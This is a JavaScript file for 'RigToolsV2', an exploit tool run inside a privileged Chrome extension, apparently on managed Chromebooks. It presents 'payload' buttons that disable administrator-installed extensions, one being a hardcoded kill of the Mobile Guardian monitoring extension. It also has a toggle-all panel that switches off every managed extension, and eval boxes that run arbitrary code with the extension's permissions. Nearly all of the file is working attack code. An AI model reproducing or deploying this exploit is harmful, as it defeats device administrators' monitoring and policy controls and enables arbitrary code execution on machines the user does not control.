onerror = alert;

const uiTemplate = `

`;
// if (chrome.fileManagerPrivate) {
// chrome.fileManagerPrivate.openURL();
// }
const managementTemplate = `

<div id="chrome_management_disable_ext">
<h1>RigToolsV2 - By Jobi#8313</h1>
<h2>This is a addon to the remake of rigtools by appleflyer.</h2>
<p> Note that this only works on extensions installed by your administrator </p>
<embed id="ltbeefwindow" style="border:5px solid black;"></embed>
<br>
<button id="runanything">Run Code</button>
<br>
<textarea id="codebox" style="width:500px;height:300px;"></textarea>
<br>
<button id="payload-1">P1 test payload</button>
<br>
<button id="payload-2">P2 kill mobile guardian(hardcoded id)</button>
<br>
<button id="payload-3">P3 kill extension by id(manual input)</button>
<br>
<button id="payload-4">P4 get self id and alert</button>
<br>
<button id="payload-5">P5 kill ext thats running injected code</button>
<br>
<button id="payload-6">P6 LTBeef (Remake by UniUB)</button>
</div>
`; // TODO: Add CSS for this
const getExtensions = (callback) => {
  chrome.management.getAll((extensions) => {
    const extensionList = extensions.map((ext) => ({
      id: ext.id,
      name: ext.name,
      version: ext.version,
      description: ext.description,
      enabled: ext.enabled, // Include the enabled status
    }));
    callback(extensionList);
  });
};

const ltbeef = (elems) => {
  let win = window.open();
  win.document.open();
  win.document.write(`
      <h1>chrome.management Disable extensions.</h1>
      <h2>Made by Jobi#8313, this is ltbeef but for the rigtools exploit :D</h2>
      <label><input type="checkbox" id="toggleAll"> Toggle All Extensions</label>
      <div id="extensionsContainer">${elems}</div>
  `);
  win.document.close();

  // Dynamically get the current extension ID from the window location
  const currentExtensionURL = window.location.href;

  // Extract the extension ID from the current URL
  const extensionId = currentExtensionURL
    .split("filesystem:chrome-extension://")[1]
    .split("/temporary/index.html")[0];

  // Assuming you have the toggle checkbox element from the window
  const toggleCheckbox = win.document.getElementById("toggleAll");
  toggleCheckbox.addEventListener("change", function () {
    const checkboxes = win.document.querySelectorAll(
      'input[type="checkbox"][ext]'
    );
    checkboxes.forEach((checkbox) => {
      const extId = checkbox.getAttribute("ext");
      // Prevent toggling the checkbox for this specific extension ID
      if (extId !== extensionId) {
        checkbox.checked = toggleCheckbox.checked; // Set the checkbox state based on toggle
        chrome.management.setEnabled(extId, toggleCheckbox.checked); // Enable or disable the extension
      } else {
        // Optionally, you could provide feedback that this extension cannot be toggled
        console.log("Cannot toggle this extension:", extId);
      }
    });
  });

  // Set the initial state of checkboxes
  const checkboxes = win.document.querySelectorAll(
    'input[type="checkbox"][ext]'
  );
  checkboxes.forEach((checkbox) => {
    const extId = checkbox.getAttribute("ext");
    checkbox.addEventListener("change", function () {
      chrome.management.setEnabled(extId, checkbox.checked); // Enable or disable the extension
    });
  });
};

let savedExtList = [];
const slides = [];
let activeSlideIdx = 0;
const handleCallbacks_ = [];
const WAIT_FOR_FINISH = 1;
requestAnimationFrame(function a(t) {
  for (const cb of handleCallbacks_) {
    let m;
    if ((m = cb.f.apply(null, [t - cb.t]))) {
      if (m === 1) {
        return;
      } else {
        handleCallbacks_.splice(handleCallbacks_.indexOf(cb), 1);
      }
    }
  }
  requestAnimationFrame(a);
});
const handleInAnimationFrame = (cb, thiz = null, args = []) => {
  handleCallbacks_.push({
    f: cb,
    t: performance.now(),
  });
};

class ExtensionCapabilities {
  static setupSlides(activeidx = 0) {
    if (chrome.management) {
      slides.push(document.querySelector("#chrome_management_disable_ext"));
    }
    slides.push(document.querySelector("#ext_default"));
    for (let i = 0; i < slides.length; i++) {
      if (i === activeidx) {
        slides[i].style.display = "block";
      } else {
        slides[i].style.display = "none";
      }
    }
    activeSlideIdx = activeidx;

    onkeydown = function (ev) {
      if (ev.repeat) return;

      if (this.getSelection() && this.getSelection().anchorNode.tagName) {
        return;
      }
      if (ev.key.toLowerCase().includes("left")) {
        activeSlideIdx--;
        if (activeSlideIdx < 0) {
          activeSlideIdx += slides.length;
        }
        activeSlideIdx %= slides.length;
        ev.preventDefault();
      }
      if (ev.key.toLowerCase().includes("right")) {
        activeSlideIdx++;
        if (activeSlideIdx < 0) {
          activeSlideIdx += slides.length;
        }
        activeSlideIdx %= slides.length;
        ev.preventDefault();
      }
      ExtensionCapabilities.setActiveSlideIndex(activeSlideIdx);
    };
  }
  static setActiveSlideIndex(idx) {
    function a(t) {
      const seconds = t / 1000;
      if (seconds >= 0.2) {
        // slides[i].style.display = "none";
        return true;
      }
      slides[idx].style.opacity = String(seconds / 0.2);
    }
    for (let i = 0; i < slides.length; i++) {
      if (i === idx) {
        slides[i].style.display = "block";
      } else {
        if (slides[i].style.display === "block") {
          slides[i].style.position = "absolute";
          const m = i;
          handleInAnimationFrame(function (t) {
            const seconds = t / 1000;
            if (0.8 - seconds <= 0) {
              slides[i].style.display = "none";
              handleInAnimationFrame(a);
              return true;
            }
            slides[i].style.opacity = String((0.2 - seconds) / 0.2);
          });
        }
        // slides[i].style.display = "none";
      }
    }
  }

  activate() {}
}
class DefaultExtensionCapabilities extends ExtensionCapabilities {
  static template = `
  <div id="ext_default">
  <div id="default_extension_capabilities">
    <h1> Default Extension Capabilities </h1>

    <h2>Evaluate code</h1>
    <input type="text" id="code_input"/><button id="code_evaluate">Evaluate</button>
    
  </div>
  <div id="extension_tabs_default">
    <button id="tabreload"> Refresh Tabs</button>
    <h1> Update tabs </h1>
    <ol>
    
    </ol>
    <input id="TabURLInput" /> <button id="TabURLSubmit">Create</button>
    
  </div>
  </div>
  `; // TODO: Fix Navigator (For now I removed it)
  updateTabList(tablist, isTabTitleQueryable, tabStatus) {
    if (this.disarmed) {
      return;
    }

    if (this.tabListInProgress) {
      console.log("In progress tablist building!");
      // setTimeout(this.updateTabList.bind(this, tablist, isTabTitleQueryable, tabStatus));
      return;
    }
    this.tabListInProgress = true;
    tablist.innerHTML = "";
    const thiz = this;
    chrome.windows.getAll(function (win) {
      win.forEach(function (v) {
        chrome.tabs.query({ windowId: v.id }, function (tabInfos) {
          tabInfos.forEach(function (info) {
            const listItem = document.createElement("li");
            listItem.textContent = isTabTitleQueryable
              ? `${info.title} (${info.url})`
              : "(not available)";
            listItem.innerHTML +=
              '<br/><input type="text" /> <button>Navigate</button>';
            const button = document.createElement("button");
            button.innerHTML = "Preview";
            listItem.querySelector("button").onclick = function (ev) {
              const inp = listItem.querySelector("input");
              chrome.tabs.update(info.id, {
                url: inp.value,
              });
            };
            button.onclick = () => {
              thiz.disarm = true;

              thiz.previewing = true;

              chrome.windows.update(
                info.windowId,
                {
                  focused: true,
                },
                function () {
                  chrome.tabs.update(info.id, { active: true });
                }
              );
              window.currentTimeout = setTimeout(function m() {
                clearTimeout(window.currentTimeout);

                chrome.tabs.getCurrent(function (tab) {
                  chrome.windows.update(
                    tab.windowId,
                    {
                      focused: true,
                    },
                    function () {
                      chrome.tabs.update(tab.id, { active: true });
                      thiz.disarm = false;
                      thiz.previewing = false;
                    }
                  );
                });
              }, 100);
            };
            tablist.appendChild(listItem);
            tablist.appendChild(button);
          });
          thiz.tabListInProgress = false;
          if (isTabTitleQueryable) {
            tabStatus.style.display = "none";
          } else {
            tabStatus.textContent =
              "(Some data might not be available, because the extension doesn't have the 'tabs' permission)";
          }
        });
      });
    });
  }
  activate() {
    document.write(DefaultExtensionCapabilities.template);
    // document.close();
    document.body
      .querySelector("#ext_default")
      .querySelectorAll("button")
      .forEach(function (btn) {
        // alert("prepping button " + btn.id);
        btn.addEventListener("click", this.onBtnClick_.bind(this, btn));
      }, this);

    this.updateTabList(
      document.body
        .querySelector("#extension_tabs_default")
        .querySelector("ol"),
      !!chrome.runtime.getManifest().permissions.includes("tabs")
    );
    for (var i in chrome.tabs) {
      if (i.startsWith("on")) {
        chrome.tabs[i].addListener(function (ev) {
          this.updateTabList(
            document.body
              .querySelector("#extension_tabs_default")
              .querySelector("ol"),
            !!chrome.runtime.getManifest().permissions.includes("tabs")
          );
        });
      }
    }
    // document.body.querySelector('')
  }
  static getFS() {
    return new Promise(function (resolve) {
      webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, resolve);
    });
  }
  /**
   * @param {HTMLButtonElement} b
   */
  async onBtnClick_(b) {
    switch (b.id) {
      case "code_evaluate": {
        console.log("Evaluating code!");
        const x = document.querySelector("#code_input").value;
        const fs = await DefaultExtensionCapabilities.getFS();
        function writeFile(file, data) {
          return new Promise((resolve, reject) => {
            fs.root.getFile(file, { create: true }, function (entry) {
              entry.remove(function () {
                fs.root.getFile(file, { create: true }, function (entry) {
                  entry.createWriter(function (writer) {
                    writer.write(new Blob([data]));
                    writer.onwriteend = resolve.bind(null, entry.toURL());
                  });
                });
              });
            });
          });
        }

        const url = await writeFile("src.js", x);
        let script =
          document.body.querySelector("#evaluate_elem") ??
          document.createElement("script");
        script.remove();
        script = document.createElement("script");
        script.id = "evaluate_elem";
        script.src = url;
        document.body.appendChild(script);
      }
      case "tabreload": {
        this.updateTabList(
          document.body
            .querySelector("#extension_tabs_default")
            .querySelector("ol"),
          !!chrome.runtime.getManifest().permissions.includes("tabs")
        );
      }
    }
  }
}
class HostPermissions {
  activate() {}
}
const fileManagerPrivateTemplate = `
  <div id="fileManagerPrivate_cap">
    <div id="FMP_openURL">
      <button id="btn_FMP_openURL">Open URL in Skiovox window</button>
    </div>
  </div>

`;
onload = async function x() {
  let foundNothing = true;
  document.open();
  if (chrome.fileManagerPrivate) {
    // alert(1);
    chrome.fileManagerPrivate.openURL("data:text/html,<h1>Hello</h1>");
    document.write(fileManagerPrivateTemplate);
    document.body.querySelector("#btn_FMP_openURL").onclick = function (ev) {};
  }
  if (chrome.management.setEnabled) {
    this.document.write(managementTemplate);
    const container_extensions = document.body.querySelector(
      "#chrome_management_disable_ext"
    );
    // payload stuff :D
    container_extensions.querySelector("#payload-1").onclick =
      async function dx(e) {
        alert("js works. p1 executed(nothing)");
      };
    container_extensions.querySelector("#payload-2").onclick =
      async function dx(e) {
        alert("payload 2 executed");
        chrome.management.setEnabled("fgmafhdohjkdhfaacgbgclmfgkgokgmb", false);
      };
    container_extensions.querySelector("#payload-3").onclick =
      async function dx(e) {
        alert("payload 3 executed");
        var exttokill;
        while (!exttokill) {
          exttokill = prompt("Extension id?");
          if (exttokill === "cancel") {
            return;
          }
        }
        if (exttokill) {
          chrome.management.setEnabled(exttokill, false);
        }
      };
    container_extensions.querySelector("#payload-4").onclick =
      async function dx(e) {
        alert("payload 4 executed");
        var alertcurrentid = chrome.runtime.id;
        alert(alertcurrentid);
      };
    container_extensions.querySelector("#payload-5").onclick =
      async function dx(e) {
        alert("payload 5 executed");
        var grabidtokill = chrome.runtime.id;
        chrome.management.setEnabled(grabidtokill, false);
      };
    container_extensions.querySelector("#payload-6").onclick =
      async function dx(e) {
        getExtensions((extensionList) => {
          let temp = "";
          extensionList.forEach((extension) => {
            if (extension) {
              temp += `
                <p>
                    ${extension.name} : ${extension.id}
                    <input type='checkbox' ext='${extension.id}' ${
                extension.enabled ? "checked" : ""
              }>
                </p>
            `;
            }
          });
          ltbeef(temp);
        });
      };

    container_extensions.querySelector("#runanything").onclick =
      async function dx(e) {
        eval(document.getElementById("codebox").value);
      };
  }
  const otherFeatures = window.chrome.runtime.getManifest();
  const permissions = otherFeatures.permissions;

  new DefaultExtensionCapabilities().activate();
  document.close();
  ExtensionCapabilities.setupSlides();
};
